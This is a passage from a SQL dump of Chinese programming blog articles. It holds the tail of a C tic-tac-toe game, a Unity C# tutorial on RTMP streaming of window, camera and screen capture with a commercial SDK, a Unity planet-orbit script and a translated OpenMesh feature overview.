while (1)\n	{\n		//玩家下棋\n		PlayerMove(board,ROW,COL);\n		DisplayBoard(board, ROW, COL);\n		//判断玩家是否赢\n		//电脑下棋\n		ret = IsWin(board, ROW, COL);\n		if (ret != \'C\')\n		{\n			break;\n		}\n		ComputerMove(board, ROW, COL);\n		DisplayBoard(board, ROW, COL);\n		//判断电脑是否赢\n		ret=IsWin(board,ROW,COL);\n		if (ret != \'C\')\n		{\n			break;\n		}\n	}\n	if (ret == \'*\')\n	{\n		printf(\"玩家赢\\n\");\n	}\n	else if (ret == \'$\')\n	{\n		printf(\"电脑赢\\n\");\n	}\n	else\n	{\n		printf(\"平局！\\n\");\n	}\n}\nvoid test()\n{\n	int input = 0;\n	srand((unsigned)time(NULL));\n	do\n	{\n		menu();\n		printf(\"请选择&gt;:\");\n		scanf(\"%d\", &amp;input);\n		switch (input)\n		{\n		case 1:\n			game();\n			break;\n		case 0:\n			printf(\"退出游戏\\n\");\n			break;\n		default:\n			printf(\"你选择的不存在，请重新选择\\n\");\n			break;\n\n		}\n	} while (input);\n}\nint main()\n{\n	test();\n	return 0;\n}</code></pre> \n <p>最后你可以想办法怎么让电脑赢！</p> \n</div>', '2021-06-12', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (57, 'Windows平台实现Unity下窗体|摄像头|屏幕采集推送', '<div id=\"content_views\" class=\"htmledit_views\"> \n <h2>技术背景</h2> \n <p>随着Unity3D的应用范围越来越广，越来越多的行业开始基于Unity3D开发产品，如传统行业中虚拟仿真教育、航空工业、室内设计、城市规划、工业仿真等领域。</p> \n <p>基于此，好多开发者苦于在Unity环境下，没有低延迟的推拉流解决方案，前几年，我们在Unity环境下推出了跨平台低延迟的RTMP|RTSP直播播放器，很好的解决了好多对延迟要求苛刻的使用场景。</p> \n <p>随着时间的推移，越来越多的开发者联系我们，希望我们能推出Unity环境下的RTMP推送模块，获取到unity的实时数据，更低延迟更高效率的实现数据传输推送，基于此，我们发布了Unity环境下的RTMP推送模块。</p> \n <p>本文以Windows平台为例，数据源分别为Unity的窗口、摄像头或整个屏幕，编码传输模块，还是调用大牛直播SDK（<a href=\"https://daniusdk.com/\">官方</a>）的原生接口，简单界面先睹为快：</p> \n <p style=\"text-align:center;\"><img alt=\"\" src=\"https://img-blog.csdnimg.cn/20210610165500362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Jlbmh1aTExMTI=,size_16,color_FFFFFF,t_70\"></p> \n <h2>技术实现</h2> \n <h3>1. 基础初始化</h3> \n <pre><code class=\"language-cs\">\n        private bool InitSDK()\n        {\n            if (!is_pusher_sdk_init_)\n            {\n                // 设置日志路径(请确保目录存在)\n                String log_path = \"D:\\\\pulisherlog\";\n                NTSmartLog.NT_SL_SetPath(log_path);\n\n                UInt32 isInited = NTSmartPublisherSDK.NT_PB_Init(0, IntPtr.Zero);\n\n                if (isInited != 0)\n                {\n                    Debug.Log(\"调用NT_PB_Init失败..\");\n                    return false;\n                }\n\n                is_pusher_sdk_init_ = true;\n            }\n\n            return true;\n        }</code></pre> \n <h3>2. 调用Open()接口，获取推送实例</h3> \n <pre><code class=\"language-cs\">       public bool OpenPublisherHandle(uint video_option, uint audio_option)\n        {\n            if (publisher_handle_ != IntPtr.Zero)\n            {\n                return true;\n            }\n\n            publisher_handle_count_ = 0;\n\n            if (NTBaseCodeDefine.NT_ERC_OK != NTSmartPublisherSDK.NT_PB_Open(out publisher_handle_,\n                video_option, audio_option, 0, IntPtr.Zero))\n            {\n                return false;\n            }\n\n            if (publisher_handle_ != IntPtr.Zero)\n            {\n                pb_event_call_back_ = new NT_PB_SDKEventCallBack(PbEventCallBack);\n\n                NTSmartPublisherSDK.NT_PB_SetEventCallBack(publisher_handle_, IntPtr.Zero, pb_event_call_back_);\n\n                return true;\n            }\n            else\n            {\n                return false;\n            }\n        }\n</code></pre> \n <h3>3. 初始化参数配置</h3> \n <p>这里需要注意下，如果要采集unity窗口，需要设置图层模式，先填充一层RGBA黑色背景，然后再添加一层，用于叠加外部数据。</p> \n <pre><code class=\"language-cs\">       private void SetCommonOptionToPublisherSDK()\n        {\n            if (!IsPublisherHandleAvailable())\n            {\n                Debug.Log(\"SetCommonOptionToPublisherSDK, publisher handle with null..\");\n                return;\n            }\n\n            NTSmartPublisherSDK.NT_PB_ClearLayersConfig(publisher_handle_, 0,\n                            0, IntPtr.Zero);\n\n            if (video_option == NTSmartPublisherDefine.NT_PB_E_VIDEO_OPTION.NT_PB_E_VIDEO_OPTION_LAYER)\n            {\n                // 第0层填充RGBA矩形, 目的是保证帧率, 颜色就填充全黑\n                int red = 0;\n                int green = 0;\n                int blue = 0;\n                int alpha = 255;\n\n                NT_PB_RGBARectangleLayerConfig rgba_layer_c0 = new NT_PB_RGBARectangleLayerConfig();\n\n                rgba_layer_c0.base_.type_ = (Int32)NTSmartPublisherDefine.NT_PB_E_LAYER_TYPE.NT_PB_E_LAYER_TYPE_RGBA_RECTANGLE;\n                rgba_layer_c0.base_.index_ = 0;\n                rgba_layer_c0.base_.enable_ = 1;\n                rgba_layer_c0.base_.region_.x_ = 0;\n                rgba_layer_c0.base_.region_.y_ = 0;\n                rgba_layer_c0.base_.region_.width_ = video_width_;\n                rgba_layer_c0.base_.region_.height_ = video_height_;\n\n                rgba_layer_c0.base_.offset_ = Marshal.OffsetOf(rgba_layer_c0.GetType(), \"base_\").ToInt32();\n                rgba_layer_c0.base_.cb_size_ = (uint)Marshal.SizeOf(rgba_layer_c0);\n\n                rgba_layer_c0.red_ = System.BitConverter.GetBytes(red)[0];\n                rgba_layer_c0.green_ = System.BitConverter.GetBytes(green)[0];\n                rgba_layer_c0.blue_ = System.BitConverter.GetBytes(blue)[0];\n                rgba_layer_c0.alpha_ = System.BitConverter.GetBytes(alpha)[0];\n\n                IntPtr rgba_conf = Marshal.AllocHGlobal(Marshal.SizeOf(rgba_layer_c0));\n\n                Marshal.StructureToPtr(rgba_layer_c0, rgba_conf, true);\n\n                UInt32 rgba_r = NTSmartPublisherSDK.NT_PB_AddLayerConfig(publisher_handle_, 0,\n                                rgba_conf, (int)NTSmartPublisherDefine.NT_PB_E_LAYER_TYPE.NT_PB_E_LAYER_TYPE_RGBA_RECTANGLE,\n                                0, IntPtr.Zero);\n\n                Marshal.FreeHGlobal(rgba_conf);\n\n                NT_PB_ExternalVideoFrameLayerConfig external_layer_c1 = new NT_PB_ExternalVideoFrameLayerConfig();\n\n                external_layer_c1.base_.type_ = (Int32)NTSmartPublisherDefine.NT_PB_E_LAYER_TYPE.NT_PB_E_LAYER_TYPE_EXTERNAL_VIDEO_FRAME;\n                external_layer_c1.base_.index_ = 1;\n                external_layer_c1.base_.enable_ = 1;\n                external_layer_c1.base_.region_.x_ = 0;\n                external_layer_c1.base_.region_.y_ = 0;\n                external_layer_c1.base_.region_.width_ = video_width_;\n                external_layer_c1.base_.region_.height_ = video_height_;\n\n                external_layer_c1.base_.offset_ = Marshal.OffsetOf(external_layer_c1.GetType(), \"base_\").ToInt32();\n                external_layer_c1.base_.cb_size_ = (uint)Marshal.SizeOf(external_layer_c1);\n\n                IntPtr external_layer_conf = Marshal.AllocHGlobal(Marshal.SizeOf(external_layer_c1));\n\n                Marshal.StructureToPtr(external_layer_c1, external_layer_conf, true);\n\n                UInt32 external_r = NTSmartPublisherSDK.NT_PB_AddLayerConfig(publisher_handle_, 0,\n                                external_layer_conf, (int)NTSmartPublisherDefine.NT_PB_E_LAYER_TYPE.NT_PB_E_LAYER_TYPE_EXTERNAL_VIDEO_FRAME,\n                                0, IntPtr.Zero);\n\n                Marshal.FreeHGlobal(external_layer_conf);\n\n            }\n            else if (video_option == NTSmartPublisherDefine.NT_PB_E_VIDEO_OPTION.NT_PB_E_VIDEO_OPTION_CAMERA)\n            {\n                CameraInfo camera = cameras_[cur_sel_camera_index_];\n                NT_PB_VideoCaptureCapability cap = camera.capabilities_[cur_sel_camera_resolutions_index_];\n\n                SetVideoCaptureDeviceBaseParameter(camera.id_.ToString(), (UInt32)cap.width_, (UInt32)cap.height_);\n            }\n\n            SetFrameRate((UInt32)CalBitRate(edit_key_frame_, video_width_, video_height_));\n\n            Int32 type = 0;   //软编码\n            Int32 encoder_id = 1;\n            UInt32 codec_id = (UInt32)NTCommonMediaDefine.NT_MEDIA_CODEC_ID.NT_MEDIA_CODEC_ID_H264;\n            Int32 param1 = 0;\n\n            SetVideoEncoder(type, encoder_id, codec_id, param1);\n\n            SetVideoQualityV2(CalVideoQuality(video_width_, video_height_, is_h264_encoder));\n\n            SetVideoMaxBitRate((CalMaxKBitRate(edit_key_frame_, video_width_, video_height_, false)));\n\n            SetVideoKeyFrameInterval((edit_key_frame_));\n\n            if (is_h264_encoder)\n            {\n                SetVideoEncoderProfile(1);\n            }\n\n            SetVideoEncoderSpeed(CalVideoEncoderSpeed(video_width_, video_height_, is_h264_encoder));\n\n            // 音频相关设置\n\n            SetAuidoInputDeviceId(0);\n            SetPublisherAudioCodecType(1);\n            SetPublisherMute(is_mute);\n            SetEchoCancellation(0, 0);\n            SetNoiseSuppression(0);\n            SetAGC(0);\n            SetVAD(0);\n            SetInputAudioVolume(Convert.ToSingle(edit_audio_input_volume_));\n        }</code></pre> \n <h3>4. 数据采集</h3> \n <p>摄像头和屏幕的数据采集，还是调用原生的SDK接口，本文不再赘述，如果需要采集Unity窗体的数据，可以用参考以下代码：</p> \n <pre><code class=\"language-cs\">        if ( texture_ == null || video_width_ != Screen.width || video_height_ != Screen.height)\n        {\n            Debug.Log(\"OnPostRender screen changed++ scr_width: \" + Screen.width + \" scr_height: \" + Screen.height);\n\n            if (screen_image_ != IntPtr.Zero)\n            {\n                Marshal.FreeHGlobal(screen_image_);\n                screen_image_ = IntPtr.Zero;\n            }\n\n            if (texture_ !=  null)\n            {\n                UnityEngine.Object.Destroy(texture_);\n                texture_ = null;\n            }\n\n            video_width_ = Screen.width;\n            video_height_ = Screen.height;\n\n            texture_ = new Texture2D(video_width_, video_height_, TextureFormat.BGRA32, false);\n\n            screen_image_ = Marshal.AllocHGlobal(video_width_ * 4 * video_height_);\n\n            Debug.Log(\"OnPostRender screen changed--\");\n\n            return;\n        }\n\n        texture_.ReadPixels(new Rect(0, 0, video_width_, video_height_), 0, 0, false);\n        texture_.Apply();</code></pre> \n <p>从 texture里面，通过调用&nbsp;GetRawTextureData()，获取到原始数据。</p> \n <h3>5. 数据对接</h3> \n <p>获取到数据后，通过调用 OnPostRGBAData()接口，传递给SDK层。</p> \n <h3>6. 本地数据预览</h3> \n <pre><code class=\"language-cs\">        public bool StartPreview()\n        {\n            if(CheckPublisherHandleAvailable() == false)\n                return false;\n\n            video_preview_image_callback_ = new NT_PB_SDKVideoPreviewImageCallBack(SDKVideoPreviewImageCallBack);\n\n            NTSmartPublisherSDK.NT_PB_SetVideoPreviewImageCallBack(publisher_handle_, (int)NTSmartPublisherDefine.NT_PB_E_IMAGE_FORMAT.NT_PB_E_IMAGE_FORMAT_RGB32, IntPtr.Zero, video_preview_image_callback_);\n\n            if (NTBaseCodeDefine.NT_ERC_OK != NTSmartPublisherSDK.NT_PB_StartPreview(publisher_handle_, 0, IntPtr.Zero))\n            {\n                if (0 == publisher_handle_count_)\n                {\n                    NTSmartPublisherSDK.NT_PB_Close(publisher_handle_);\n                    publisher_handle_ = IntPtr.Zero;\n                }\n\n                return false;\n            }\n\n            publisher_handle_count_++;\n\n            is_previewing_ = true;\n\n            return true;\n        }</code></pre> \n <p>设置preview后，处理preview的数据回调</p> \n <pre><code class=\"language-cs\">        //预览数据回调\n        public void SDKVideoPreviewImageCallBack(IntPtr handle, IntPtr user_data, IntPtr image)\n        {\n            NT_PB_Image pb_image = (NT_PB_Image)Marshal.PtrToStructure(image, typeof(NT_PB_Image));\n\n            NT_VideoFrame pVideoFrame = new NT_VideoFrame();\n\n            pVideoFrame.width_ = pb_image.width_;\n            pVideoFrame.height_ = pb_image.height_;\n\n            pVideoFrame.stride_ = pb_image.stride_[0];\n\n            Int32 argb_size = pb_image.stride_[0] * pb_image.height_;\n\n            pVideoFrame.plane_data_ = new byte[argb_size];\n            \n            if (argb_size &gt; 0)\n            {\n                Marshal.Copy(pb_image.plane_[0],pVideoFrame.plane_data_,0, argb_size);\n            }\n\n            {\n                cur_image_ = pVideoFrame;\n            }\n        }      </code></pre> \n <h3>7. 相关event回调处理</h3> \n <pre><code class=\"language-cs\">        private void PbEventCallBack(IntPtr handle, IntPtr user_data, \n            UInt32 event_id,\n            Int64 param1,\n            Int64 param2,\n            UInt64 param3,\n            UInt64 param4,\n            [MarshalAs(UnmanagedType.LPStr)] String param5,\n            [MarshalAs(UnmanagedType.LPStr)] String param6,\n            IntPtr param7)\n        {\n            String event_log = \"\";\n\n            switch (event_id)\n            {\n                case (uint)NTSmartPublisherDefine.NT_PB_E_EVENT_ID.NT_PB_E_EVENT_ID_CONNECTING:\n                    event_log = \"连接中\";\n                    if (!String.IsNullOrEmpty(param5))\n                    {\n                        event_log = event_log + \" url:\" + param5;\n                    }\n                    break;\n\n                case (uint)NTSmartPublisherDefine.NT_PB_E_EVENT_ID.NT_PB_E_EVENT_ID_CONNECTION_FAILED:\n                    event_log = \"连接失败\";\n                    if (!String.IsNullOrEmpty(param5))\n                    {\n                        event_log = event_log + \" url:\" + param5;\n                    }\n                    break;\n\n                case (uint)NTSmartPublisherDefine.NT_PB_E_EVENT_ID.NT_PB_E_EVENT_ID_CONNECTED:\n                    event_log = \"已连接\";\n                    if (!String.IsNullOrEmpty(param5))\n                    {\n                        event_log = event_log + \" url:\" + param5;\n                    }\n                    break;\n\n                case (uint)NTSmartPublisherDefine.NT_PB_E_EVENT_ID.NT_PB_E_EVENT_ID_DISCONNECTED:\n                    event_log = \"断开连接\";\n                    if (!String.IsNullOrEmpty(param5))\n                    {\n                        event_log = event_log + \" url:\" + param5;\n                    }\n                    break;\n\n                default:\n                    break;\n            }\n\n            if(OnLogEventMsg != null) OnLogEventMsg.Invoke(event_id, event_log);\n        }</code></pre> \n <h3>8. 开始推送、停止推送</h3> \n <pre><code class=\"language-cs\">       public bool StartPublisher(String url)\n        {\n            if (CheckPublisherHandleAvailable() == false) return false;\n\n            if (publisher_handle_ == IntPtr.Zero)\n            {\n                return false;\n            }\n            if (!String.IsNullOrEmpty(url))\n            {\n                NTSmartPublisherSDK.NT_PB_SetURL(publisher_handle_, url, IntPtr.Zero);\n            }\n\n            if (NTBaseCodeDefine.NT_ERC_OK != NTSmartPublisherSDK.NT_PB_StartPublisher(publisher_handle_, IntPtr.Zero))\n            {\n                if (0 == publisher_handle_count_)\n                {\n                    NTSmartPublisherSDK.NT_PB_Close(publisher_handle_);\n                    publisher_handle_ = IntPtr.Zero;\n                }\n\n                is_publishing_ = false;\n\n                return false;\n            }\n\n            publisher_handle_count_++;\n\n            is_publishing_ = true;\n\n            return true;\n        }\n\n        public void StopPublisher()\n        {\n            if (is_publishing_ == false) return;\n\n            publisher_handle_count_--;\n            NTSmartPublisherSDK.NT_PB_StopPublisher(publisher_handle_);\n\n            if (0 == publisher_handle_count_)\n            {\n                NTSmartPublisherSDK.NT_PB_Close(publisher_handle_);\n                publisher_handle_ = IntPtr.Zero;\n            }\n\n            is_publishing_ = false;\n        }</code></pre> \n <h3>9. 关闭实例</h3> \n <pre><code class=\"language-cs\">        public void Close()\n        {\n            if (0 == publisher_handle_count_)\n            {\n                NTSmartPublisherSDK.NT_PB_Close(publisher_handle_);\n                publisher_handle_ = IntPtr.Zero;\n            }\n        }</code></pre> \n <h2>总结</h2> \n <p>经测试，Unity环境下，通过高效率的数据采集、编码和推送，配合SmartPlayer播放器播放，整体延迟可控制在毫秒级，可适用于大多数Unity环境下对延迟和稳定性要求苛刻的场景。</p> \n</div>', '2021-06-12', '2021-06-15', '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (58, '关于公转与自转的相关代码', '<div id=\"content_views\" class=\"markdown_views prism-atom-one-dark\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <p>创建好一个Unity3D项目，名字随意。<br> 并创建一个名为Roteta的脚本，以下为此脚本的代码，复制替换脚本中的代码</p> \n <pre><code class=\"prism language-csharp\"><span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Collections</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Collections<span class=\"token punctuation\">.</span>Generic</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">using</span> <span class=\"token namespace\">UnityEngine</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Roteta</span> <span class=\"token punctuation\">:</span> <span class=\"token type-list\"><span class=\"token class-name\">MonoBehaviour</span></span>\n<span class=\"token punctuation\">{\n    <!-- --></span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">GameObject</span> Sun<span class=\"token punctuation\">;</span>      <span class=\"token comment\">//太阳</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">GameObject</span> Mercury<span class=\"token punctuation\">;</span>  <span class=\"token comment\">//水星</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">GameObject</span> Venus<span class=\"token punctuation\">;</span>    <span class=\"token comment\">//金星</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">GameObject</span> Earth<span class=\"token punctuation\">;</span>    <span class=\"token comment\">//地球</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">GameObject</span> Mars<span class=\"token punctuation\">;</span>     <span class=\"token comment\">//火星</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">GameObject</span> Jupiter<span class=\"token punctuation\">;</span>  <span class=\"token comment\">//木星</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">GameObject</span> Saturn<span class=\"token punctuation\">;</span>   <span class=\"token comment\">//土星</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">GameObject</span> Uranus<span class=\"token punctuation\">;</span>   <span class=\"token comment\">//天王星</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">GameObject</span> Neptune<span class=\"token punctuation\">;</span>  <span class=\"token comment\">//海王星</span>\n\n  \n    <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">Update</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{\n    <!-- --></span>\n        Mercury<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span><span class=\"token function\">RotateAround</span><span class=\"token punctuation\">(</span>Sun<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span>position<span class=\"token punctuation\">,</span> Sun<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span>up<span class=\"token punctuation\">,</span> <span class=\"token number\">1.5f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Venus<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span><span class=\"token function\">RotateAround</span><span class=\"token punctuation\">(</span>Sun<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span>position<span class=\"token punctuation\">,</span> Sun<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span>up<span class=\"token punctuation\">,</span> <span class=\"token number\">1.25f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Earth<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span><span class=\"token function\">RotateAround</span><span class=\"token punctuation\">(</span>Sun<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span>position<span class=\"token punctuation\">,</span> Sun<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span>up<span class=\"token punctuation\">,</span> <span class=\"token number\">1f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Mars<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span><span class=\"token function\">RotateAround</span><span class=\"token punctuation\">(</span>Sun<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span>position<span class=\"token punctuation\">,</span> Sun<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span>up<span class=\"token punctuation\">,</span> <span class=\"token number\">0.8f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Jupiter<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span><span class=\"token function\">RotateAround</span><span class=\"token punctuation\">(</span>Sun<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span>position<span class=\"token punctuation\">,</span> Sun<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span>up<span class=\"token punctuation\">,</span> <span class=\"token number\">0.7f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Saturn<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span><span class=\"token function\">RotateAround</span><span class=\"token punctuation\">(</span>Sun<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span>position<span class=\"token punctuation\">,</span> Sun<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span>up<span class=\"token punctuation\">,</span> <span class=\"token number\">0.6f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Uranus<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span><span class=\"token function\">RotateAround</span><span class=\"token punctuation\">(</span>Sun<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span>position<span class=\"token punctuation\">,</span> Sun<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span>up<span class=\"token punctuation\">,</span> <span class=\"token number\">0.5f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Neptune<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span><span class=\"token function\">RotateAround</span><span class=\"token punctuation\">(</span>Sun<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span>position<span class=\"token punctuation\">,</span> Sun<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span>up<span class=\"token punctuation\">,</span> <span class=\"token number\">0.4f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//公转</span>\n\n        Mercury<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span><span class=\"token function\">Rotate</span><span class=\"token punctuation\">(</span>Vector3<span class=\"token punctuation\">.</span>down <span class=\"token operator\">*</span> <span class=\"token number\">0.5f</span><span class=\"token punctuation\">,</span> Space<span class=\"token punctuation\">.</span>World<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Venus<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span><span class=\"token function\">Rotate</span><span class=\"token punctuation\">(</span>Vector3<span class=\"token punctuation\">.</span>down <span class=\"token operator\">*</span> <span class=\"token number\">0.2f</span><span class=\"token punctuation\">,</span> Space<span class=\"token punctuation\">.</span>World<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Earth<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span><span class=\"token function\">Rotate</span><span class=\"token punctuation\">(</span>Vector3<span class=\"token punctuation\">.</span>down <span class=\"token operator\">*</span> <span class=\"token number\">0.8f</span><span class=\"token punctuation\">,</span> Space<span class=\"token punctuation\">.</span>World<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Mars<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span><span class=\"token function\">Rotate</span><span class=\"token punctuation\">(</span>Vector3<span class=\"token punctuation\">.</span>down <span class=\"token operator\">*</span> <span class=\"token number\">0.85f</span><span class=\"token punctuation\">,</span> Space<span class=\"token punctuation\">.</span>World<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Jupiter<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span><span class=\"token function\">Rotate</span><span class=\"token punctuation\">(</span>Vector3<span class=\"token punctuation\">.</span>down <span class=\"token operator\">*</span> <span class=\"token number\">1.3f</span><span class=\"token punctuation\">,</span> Space<span class=\"token punctuation\">.</span>World<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Saturn<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span><span class=\"token function\">Rotate</span><span class=\"token punctuation\">(</span>Vector3<span class=\"token punctuation\">.</span>down <span class=\"token operator\">*</span> <span class=\"token number\">1.2f</span><span class=\"token punctuation\">,</span> Space<span class=\"token punctuation\">.</span>World<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Uranus<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span><span class=\"token function\">Rotate</span><span class=\"token punctuation\">(</span>Vector3<span class=\"token punctuation\">.</span>down <span class=\"token operator\">*</span> <span class=\"token number\">1.1f</span><span class=\"token punctuation\">,</span> Space<span class=\"token punctuation\">.</span>World<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        Neptune<span class=\"token punctuation\">.</span>transform<span class=\"token punctuation\">.</span><span class=\"token function\">Rotate</span><span class=\"token punctuation\">(</span>Vector3<span class=\"token punctuation\">.</span>down <span class=\"token operator\">*</span> <span class=\"token number\">1.15f</span><span class=\"token punctuation\">,</span> Space<span class=\"token punctuation\">.</span>World<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//自转</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre> \n <p>这是公转与自转的相关代码<br> 在unity中创建9个圆（Sphere）给它们上颜色设置好大小以方便分别，效果想再明显的话可以再在每个素材球上加上图片。<img src=\"https://img-blog.csdnimg.cn/20210610213044480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdfbmFzaGE=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> <img src=\"https://img-blog.csdnimg.cn/20210610213047287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdfbmFzaGE=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 设置好后创建一个Gameobject，挂载最上方的代码，并将圆（Sphere）依次赋给代码脚本的变量中<br> 完成以上操作运行下程序看看</p> \n</div>', '2021-06-12', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (59, '&lt;2x1&gt;OpenMesh译稿：使用并理解OpenMesh-OpenMesh的功能和目标', '<div id=\"content_views\" class=\"htmledit_views\"> \n <h3 style=\"margin-left:0cm;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<img alt=\"\" class=\"has\" height=\"126\" src=\"https://img-blog.csdnimg.cn/20190107084300435.png\" width=\"415\"></h3> \n <h3 style=\"margin-left:0cm;\">OpenMesh的功能和目标</h3> \n <p>底层数据结构的主要特征：</p> \n <ol> \n  <li>不仅限于三角形网格，也可以处理多边形网格；</li> \n  <li>顶点，半边，边及面的显示表示；</li> \n  <li>有效访问顶点的单环领域；</li> \n  <li>能够处理非流形几何（例如，两个面仅通过一个顶点相连）；</li> \n </ol> \n <p>使用C++的目的/特性：</p> \n <ol> \n  <li>柔顺性：</li> \n </ol> \n <ol> \n  <li>为标量及坐标选择合适的类型（例如，满足二维、三维或n维的float、double类型运算）；</li> \n  <li>根据您自己的需求属性/性质强化项目类型。例如，加入一个向量或者FaceHandle类到Vertex类型中；</li> \n </ol> \n <ol> \n  <li>效率高：</li> \n </ol> \n <ol> \n  <li>避免虚拟继承和虚函数调用开销；</li> \n  <li>在编译时解析尽可能多的类型/属性依赖性，而不是在运行时测试属性（例如，面的法向量）。</li> \n </ol> \n <ol> \n  <li>句柄类型安全</li> \n </ol> \n <p style=\"margin-left:0cm;\">不存在类型转换，顶点、半边、面能够识别其对应的句柄</p> \n <p style=\"margin-left:0cm;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 自从版本0.10.0开始，支持Microsoft Visual C &amp;</p> \n</div>', '2021-06-12', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
